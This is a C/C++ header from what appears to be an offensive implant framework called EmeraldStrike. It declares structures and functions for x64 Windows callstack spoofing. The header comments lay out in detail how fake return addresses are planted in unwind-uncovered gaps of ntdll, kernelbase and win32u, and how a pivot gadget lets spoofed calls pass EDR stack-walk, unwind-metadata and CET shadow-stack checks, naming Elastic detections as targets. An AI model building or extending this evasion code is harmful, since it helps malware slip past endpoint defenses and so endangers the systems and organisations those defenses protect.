/*
    EmeraldStrike - LACUNA Callstack Spoofing
    Based on LACUNA Chain (0xmaz, 2026) + BYOUD (klezVirus, BHEU 2025).

    Ghost-frame engine: instead of the deprecated SilentMoonwalk desync
    (gadget frames caught by Elastic image_rop / RASD gadget scans), fake
    return addresses are planted at .pdata LACUNAE - executable code in
    ntdll/kernelbase/win32u with NO RUNTIME_FUNCTION coverage. The unwinder
    treats each as a leaf (Rip=[Rsp]; Rsp+=8), so a chain of planted ghosts
    walks as a structurally valid callstack in signed, file-backed modules:
    passes module-of-origin, CALL-preceded, unwind-metadata and CET
    shadow-stack-compare checks that kill the desync design.

    Two primitives, both on a DEDICATED synthetic stack (real parent frames
    are never modified - the stomping architecture is retired, see
    references/notes-windows-rework.md for the four-generation failure
    history):
      1. ghost_spoof_call (<= 4 register args): target entered with
         [rsp]=ghost jmp[rbx] gadget (exec restore), shadow space = L1..L4
         ghosts, MfAnchor + planted machine frame (Rip=0) terminating the
         walk.
      2. ghost_spoof_call_args (any arg count, transport-class calls):
         stack args need [rsp+0x28..], which collides with the chain window,
         so the chain is relocated above the arg block via a PIVOT gadget:
         an `add rsp,imm; ret` that is the FINAL instruction of a real
         .pdata-covered function whose declared frame size == imm (no
         pushes, no frame register). The target is entered with [rsp]=pivot:
         execution rets into the pivot, which lands on the ghost gadget and
         restores; a walker unwinds the pivot's EPILOGUE-offset RIP through
         its real prolog metadata, so its Rsp jumps imm bytes past the arg
         block onto the planted [gadget][L1..L4][mf-anchor][machframe] chain
         and terminates at Rip=0. The chain lives above the last stack arg -
         where no well-formed callee ever writes - so home-space-spilling
         Win32 APIs (wininet) are safe on this path, unlike primitive 1.

    All state in INSTANCE. x64 only. Gated by INCLUDE_EVASION_CALLSTACK_SPOOF.
*/

#ifndef EMERALDSTRIKE_CALLSTACK_SPOOF_H
#define EMERALDSTRIKE_CALLSTACK_SPOOF_H

#ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
#ifdef _WIN64

#include <windows.h>

// ============================================================================
// Unwind info structures (not in MinGW headers)
// ============================================================================

typedef unsigned char UBYTE;

typedef union _DS_UNWIND_CODE {
    struct {
        UBYTE CodeOffset;
        UBYTE UnwindOp : 4;
        UBYTE OpInfo   : 4;
    };
    USHORT FrameOffset;
} DS_UNWIND_CODE, *PDS_UNWIND_CODE;

typedef struct _DS_UNWIND_INFO {
    UBYTE Version       : 3;
    UBYTE Flags         : 5;
    UBYTE SizeOfProlog;
    UBYTE CountOfCodes;
    UBYTE FrameRegister : 4;
    UBYTE FrameOffset   : 4;
    DS_UNWIND_CODE UnwindCode[1];
} DS_UNWIND_INFO, *PDS_UNWIND_INFO;

// Unwind opcodes (only PUSH_MACHFRAME matters for the MF-anchor hunt)
#define DS_UWOP_PUSH_MACH_FRAME  10

// Spoof mode constants (must match config.h)
#define SPOOF_NONE    0
#define SPOOF_WMI     1
#define SPOOF_RPC     2
#define SPOOF_CUSTOM  3

// ============================================================================
// Ghost record (discovery output)
// ============================================================================

#define CS_MAX_GHOSTS   128
// CS_MAX_ARGS: hard cap on spoofed-call arguments (register + stack).
#define CS_MAX_ARGS     11

typedef struct _CS_GHOST {
    UINT64  va_start;               // gap start VA (prev EndAddress)
    UINT64  va_end;                 // gap end VA (next BeginAddress)
    UINT32  size;
    const char* name;               // nearest tracked export name (or NULL)
    UINT32  dist;                   // distance to that export
} CS_GHOST, *PCS_GHOST;

// ============================================================================
// GHOST_SPOOFER struct - must match layout in ghost_spoof.x64.asm
// All fields 8-byte aligned.
// ============================================================================

typedef struct _GHOST_SPOOFER {
    /* Module bases */
    PVOID   NtdllBase;                  // +0x00
    PVOID   KernelBase;                 // +0x08
    PVOID   Win32uBase;                 // +0x10 (NULL if not loaded)

    /* Chain, walked low -> high:
       GhostGadget is the target's return-address slot: executes as
       jmp [rbx] (restore), walks as a leaf inside a ghost region.
       L5ThreadRoot (RtlUserThreadStart+0x21) is kept ONLY for reporting -
       on ntdll 26100+ its unwind info is a plain ALLOC_SMALL frame and does
       NOT terminate a walk, so the primitive terminates via MfAnchor and a
       planted machine frame with Rip=0 instead. */
    PVOID   GhostGadget;                // +0x18
    PVOID   L1Ghost;                    // +0x20
    PVOID   L2Ghost;                    // +0x28 (kernelbase ghost)
    PVOID   L3Ghost;                    // +0x30 (ntdll ghost)
    PVOID   L4NopGap;                   // +0x38 (win32u nop gap)
    PVOID   L5ThreadRoot;               // +0x40 (reporting only)

    /* Chain bounds (reporting/diagnostic: full span of discovered chain
       addresses; the plant/restore VEH guard is retired with the windows) */
    UINT64  ChainMin;                   // +0x48
    UINT64  ChainMax;                   // +0x50

    /* Call API (consumed by ghost_spoof_call asm) */
    PVOID   Target;                     // +0x58
    UINT64  Nargs;                      // +0x60
    PVOID   Arg1;                       // +0x68
    PVOID   Arg2;                       // +0x70
    PVOID   Arg3;                       // +0x78
    PVOID   Arg4;                       // +0x80
    PVOID   MfAnchor;                    // +0x88 KiUser*Dispatcher+4 (machframe
                                        // function): unwinding it consumes the
                                        // planted machine frame and terminates
                                        // the walk (Rip=0) for ANY walker

    /* >4-arg pivot primitive (ghost_spoof_call_args). PivotGadget = the
       address of a `jmp [rbx]` (FF 23) inside a .pdata-covered function
       whose UNWIND_INFO parses clean (version 1, no chained info, no
       frame register) and whose declared frame size is PivotImm >= 0x28.
       Planted as the target's return address: execution rets into the
       2-byte jmp and lands on ghost_restore via rbx (the restore-slot
       pointer, callee-saved); the walker replays the containing
       function's full prolog from the mid-function RIP and its Rsp
       jumps PivotImm bytes onto the planted chain. PivotImm caps the
       supported stack-arg count: Nargs <= 4 + (PivotImm-0x20)/8. */
    PVOID   PivotGadget;                // +0x90
    UINT64  PivotImm;                   // +0x98 (containing function frame size)
    PVOID   StackArgs;                  // +0xA0 asm copies arg5..argN from here
    PVOID   PivotWindowRsp;             // +0xA8 asm stores the synthetic window
                                        // base R here before the teleport - the
                                        // probe dumps the window from it
    PVOID   PivotCandidate;             // +0xB0 last gadget under calibration
                                        // (crash-dump diagnostics)

    /* window state: the stomping windows are RETIRED (see file header);
       bPlanted stays FALSE forever and only gates the probe's
       RtlCaptureStackBackTrace run (never on a synthetic window). */
    BOOL    bPlanted;                   // +0xB0

    /* ---- verification probe results (spooftest; asm reads nothing below) ---- */
    PVOID   ProbeFrames[24];
    DWORD   ProbeCount;
    DWORD   ProbeTypes[24];
    PVOID   ProbeBases[24];
    UINT64  ProbeRsp;
    UINT64  ProbeRbp;
    UINT64  ProbeStack[48];
    UINT64  LookupEntry;
    UINT64  LookupBase;
    UINT64  VUnwindNextRip;
    UINT64  VUnwindNextRsp;
    DWORD   WalkFrameChainCount;
} GHOST_SPOOFER, *PGHOST_SPOOFER;

// ============================================================================
// API
// ============================================================================

struct _INSTANCE;

// Discover lacunae ghosts across ntdll/kernelbase/win32u, pick the chain,
// resolve the ghost gadget and thread root. Returns TRUE when at least the
// stomp path is usable; the call primitive additionally needs GhostGadget.
BOOL callstack_spoof_init(struct _INSTANCE* inst);

// ASM: perform a ghost-chain spoofed call (<= 4 register args; dispatcher
// guards this - never call directly with stack arguments).
extern "C" PVOID ghost_spoof_call(PGHOST_SPOOFER pConfig);

// ASM: pivot-variant for 5..CS_MAX_ARGS total arguments. Requires
// PivotGadget/PivotImm/StackArgs to be filled. The dispatcher guards this -
// never call directly.
extern "C" PVOID ghost_spoof_call_args(PGHOST_SPOOFER pConfig);

// ASM: calibration setjmp/bail pair (VEH-guarded fault recovery during
// pivot gadget discovery). cs_calib_set returns 0 normally, 1 when the VEH
// diverted a fault while it was armed.
extern "C" UINT64 cs_calib_set(PVOID sav);
extern "C" VOID   cs_calib_bail(PVOID sav);

// Spoofed dispatch: <= 4 args -> ghost_spoof_call; 5..11 -> pivot primitive
// when the discovered pivot supports the count. Falls back to a plain
// direct call if not initialized or the primitive is unavailable.
PVOID callstack_spoofed_call(struct _INSTANCE* inst, PVOID pTarget, DWORD nArgs, ...);

// RETIRED stomp windows: permanent no-ops kept for the transport/sleep call
// sites still including the shim. The synthetic-stack primitives above are
// the replacement (see references/notes-windows-rework.md for the failure
// history that killed frame stomping).
VOID ghost_chain_plant(struct _INSTANCE* inst);
VOID ghost_chain_restore(struct _INSTANCE* inst);

// Self-verification: manual RtlCaptureContext + RtlLookupFunctionEntry +
// RtlVirtualUnwind walk from inside a spoofed call (the primitive EDR
// walkers use), plus per-chain-address leaf-validation. Results in the
// Probe* fields.
BOOL callstack_spoof_verify(struct _INSTANCE* inst, BOOL bSpoofed);

#endif // _WIN64
#endif // INCLUDE_EVASION_CALLSTACK_SPOOF
#endif // EMERALDSTRIKE_CALLSTACK_SPOOF_H
